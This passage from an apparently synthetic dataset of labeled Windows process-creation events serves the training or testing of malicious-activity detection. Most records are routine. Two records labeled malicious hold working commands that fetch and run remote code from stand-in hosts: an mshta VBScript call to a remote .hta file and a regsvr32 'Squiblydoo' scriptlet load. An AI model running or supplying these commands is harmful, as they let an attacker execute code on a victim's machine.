    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T15:02:11.282Z",
    "ProcessGuid": "{6FD6760F-1F1C-44A7-94F2-C9A8088082CD}",
    "ProcessId": 27409,
    "Image": "C:\\Users\\sysadmin\\Downloads\\installer.exe",
    "CommandLine": "installer.exe --silent --accept-license",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 10427,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T08:36:03.154Z",
    "ProcessGuid": "{D60F1D80-E9C7-496A-9259-C736DF21FCC3}",
    "ProcessId": 50298,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 46643,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T14:53:30.483Z",
    "ProcessGuid": "{010A407F-5125-41EC-AB57-11F0EAF58BD4}",
    "ProcessId": 16973,
    "Image": "C:\\Windows\\explorer.exe",
    "CommandLine": "explorer.exe C:\\Users\\pchen\\Documents",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 30935,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T01:52:55.029Z",
    "ProcessGuid": "{9C3E652F-30C3-4716-9387-F0FD5A032803}",
    "ProcessId": 6323,
    "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "CommandLine": "\"C:\\Program Files\\Windows Defender\\MsMpEng.exe\"",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 3979,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T08:59:26.024Z",
    "ProcessGuid": "{7CE71419-FEDA-4C3F-A81A-62E91F4FB3D6}",
    "ProcessId": 16269,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 36490,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T16:34:00.641Z",
    "ProcessGuid": "{2F40BD17-BDDC-4A24-940D-DAF6950BCF65}",
    "ProcessId": 5290,
    "Image": "C:\\Windows\\regedit.exe",
    "CommandLine": "regedit.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 14813,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T04:19:10.165Z",
    "ProcessGuid": "{279D26D8-2A3B-410E-A500-69820167FD03}",
    "ProcessId": 22145,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 62258,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T09:27:42.744Z",
    "ProcessGuid": "{ED548E4B-533B-4819-8B08-5574A155D8F8}",
    "ProcessId": 17290,
    "Image": "C:\\Users\\itops\\Downloads\\setup.exe",
    "CommandLine": "setup.exe /S /v/qn",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 32583,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T11:16:13.338Z",
    "ProcessGuid": "{503F81FB-2A5F-4838-BA49-4C784CF16FAC}",
    "ProcessId": 43382,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net view \\\\fileserver",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 6181,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T19:50:43.432Z",
    "ProcessGuid": "{93AA4B89-7DBD-45FE-B507-15D7EFA77917}",
    "ProcessId": 40086,
    "Image": "C:\\Program Files\\7-Zip\\7zFM.exe",
    "CommandLine": "7zFM.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 5163,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T05:35:25.516Z",
    "ProcessGuid": "{3B92A016-1C36-4E6F-BB66-1CF4D734CE78}",
    "ProcessId": 23119,
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "schtasks.exe /run /tn \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\"",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 44092,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T02:02:47.144Z",
    "ProcessGuid": "{B49C83A5-1B03-4229-80CD-AE2E5BDAB54A}",
    "ProcessId": 33040,
    "Image": "C:\\Windows\\System32\\mshta.exe",
    "CommandLine": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"http://evil-payload6653.net/script217.hta\"\"\")",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "explorer.exe",
    "ParentProcessId": 43849,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1218.005",
    "technique_name": "Mshta Remote HTA",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-05T14:50:14.141Z",
    "ProcessGuid": "{3D1AF6E8-CC06-45DE-8506-C1471DF3FE69}",
    "ProcessId": 53544,
    "Image": "C:\\Windows\\System32\\regsvr32.exe",
    "CommandLine": "regsvr32.exe /s C:\\Program Files\\Microsoft Office\\root\\Office16\\GROOVEEX.DLL",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 29103,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-03T13:26:02.576Z",
    "ProcessGuid": "{9B058064-A1E8-42C5-BC89-507FFA481F09}",
    "ProcessId": 57628,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net user",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 15501,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T15:12:06.032Z",
    "ProcessGuid": "{7A8A6458-3CC9-44A8-AFF7-4EFE9F0C4287}",
    "ProcessId": 38421,
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "schtasks.exe /run /tn \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\"",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 43057,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T16:31:49.754Z",
    "ProcessGuid": "{AA38BE97-5511-4DAA-9507-C9473FA67781}",
    "ProcessId": 30290,
    "Image": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "CommandLine": "firefox.exe -contentproc -childID 7",
    "ParentImage": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"",
    "ParentProcessId": 59302,
    "User": "CORP\\analyst01",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T10:41:44.005Z",
    "ProcessGuid": "{54DAC14D-E553-45AF-87CA-A2E9C4F87953}",
    "ProcessId": 59501,
    "Image": "C:\\Windows\\explorer.exe",
    "CommandLine": "explorer.exe C:\\Users\\analyst02\\Documents",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 50215,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T16:43:31.784Z",
    "ProcessGuid": "{62A20CA8-F94B-403E-BE8D-55614B24AD6F}",
    "ProcessId": 37140,
    "Image": "C:\\Windows\\System32\\taskeng.exe",
    "CommandLine": "taskeng.exe {GUID} S",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 11101,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T16:38:42.106Z",
    "ProcessGuid": "{9D6484A7-0424-499A-9EAF-7A97AB5A948A}",
    "ProcessId": 47294,
    "Image": "C:\\Windows\\System32\\rundll32.exe",
    "CommandLine": "rundll32.exe shell32.dll,SHCreateLocalServerRunDll {GUID}",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 4304,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-02T18:16:24.335Z",
    "ProcessGuid": "{AFB776B0-24BA-4D24-8948-1E3FDD8A06ED}",
    "ProcessId": 14871,
    "Image": "C:\\Windows\\System32\\calc.exe",
    "CommandLine": "calc.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 30799,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T17:27:24.004Z",
    "ProcessGuid": "{C39DA5DF-033F-4321-9B03-6690F67D2742}",
    "ProcessId": 47185,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 15076,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T17:50:31.352Z",
    "ProcessGuid": "{FDADBB80-399E-4FE1-9451-6FBFACC80BF8}",
    "ProcessId": 60813,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 38070,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T17:52:46.913Z",
    "ProcessGuid": "{0A339E7F-2F8B-439C-8934-BDDE59B44A70}",
    "ProcessId": 34081,
    "Image": "C:\\Program Files\\Slack\\Slack.exe",
    "CommandLine": "Slack.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 28966,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T12:21:29.803Z",
    "ProcessGuid": "{4F86EDD8-EC68-4F30-AB80-A8B0B08F0A17}",
    "ProcessId": 14557,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-Service | Where-Object {$_.Status -eq 'Running'}\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 35151,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T11:12:13.639Z",
    "ProcessGuid": "{A35E3913-5A11-4B50-B754-21FDD445F5D7}",
    "ProcessId": 47817,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i C:\\Temp\\update_9.5.91.msi /passive /norestart",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 20043,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T05:06:15.672Z",
    "ProcessGuid": "{7CAD0EE2-15C9-4FBA-9BFC-169E81284FBA}",
    "ProcessId": 16804,
    "Image": "C:\\Windows\\SoftwareDistribution\\Download\\Install\\update.exe",
    "CommandLine": "update.exe /quiet /norestart",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 18467,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T09:15:35.615Z",
    "ProcessGuid": "{AF3F344F-4656-410C-A178-DAFBA688B332}",
    "ProcessId": 40322,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 48263,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T04:47:10.966Z",
    "ProcessGuid": "{43C3B5ED-8DAB-47C9-AF39-C0809F29B52F}",
    "ProcessId": 37636,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -Command \"Get-EventLog -LogName Security -After (Get-Date).AddHours(-24) | Export-Csv C:\\Reports\\security_audit.csv\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 25204,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-03T01:41:30.895Z",
    "ProcessGuid": "{F3E8AA7C-6F8A-49B2-A309-24E2C9A3E4C5}",
    "ProcessId": 25327,
    "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "CommandLine": "\"C:\\Program Files\\Windows Defender\\MsMpEng.exe\"",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 37342,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T14:58:51.585Z",
    "ProcessGuid": "{8F8AC76D-0099-412A-B900-BC8C80BB5DFA}",
    "ProcessId": 43718,
    "Image": "C:\\Windows\\System32\\taskhostw.exe",
    "CommandLine": "taskhostw.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 13336,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T01:18:12.044Z",
    "ProcessGuid": "{72957AC3-03A4-4E5E-BC89-36501561F0D8}",
    "ProcessId": 52846,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k LocalService -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 14072,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T11:47:07.764Z",
    "ProcessGuid": "{86713542-C952-41AF-8798-2B249F7BDE6E}",
    "ProcessId": 50435,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c tasklist",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 32386,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T20:19:39.546Z",
    "ProcessGuid": "{7E8D2167-24B8-4252-8E90-A424F5D699F8}",
    "ProcessId": 7122,
    "Image": "C:\\Windows\\System32\\taskhostw.exe",
    "CommandLine": "taskhostw.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 33936,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T09:43:14.482Z",
    "ProcessGuid": "{8DF326AB-1817-4523-A98C-A3C248336AAB}",
    "ProcessId": 2640,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 41602,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T02:57:00.427Z",
    "ProcessGuid": "{2794CA43-F573-4776-9FF0-D4B64123A90D}",
    "ProcessId": 65237,
    "Image": "C:\\Windows\\System32\\regsvr32.exe",
    "CommandLine": "regsvr32 /s /n /u /i:http://phish-host7024.xyz/payloads/file254.sct scrobj.dll",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 3898,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1218.010",
    "technique_name": "Regsvr32 Squiblydoo",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-03T14:15:09.099Z",
    "ProcessGuid": "{B804F6C6-388A-4ED7-8B28-1E60CA881600}",
    "ProcessId": 4316,
    "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "CommandLine": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 20019,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T16:00:41.737Z",
    "ProcessGuid": "{3480E89B-F371-4CCC-A484-3788913DE184}",
    "ProcessId": 41524,
    "Image": "C:\\Windows\\System32\\taskmgr.exe",
    "CommandLine": "taskmgr.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 5144,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T10:58:51.990Z",
    "ProcessGuid": "{293B9D01-FECC-46F0-BADF-E197BD49CCCB}",
    "ProcessId": 41067,
    "Image": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "CommandLine": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 15476,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
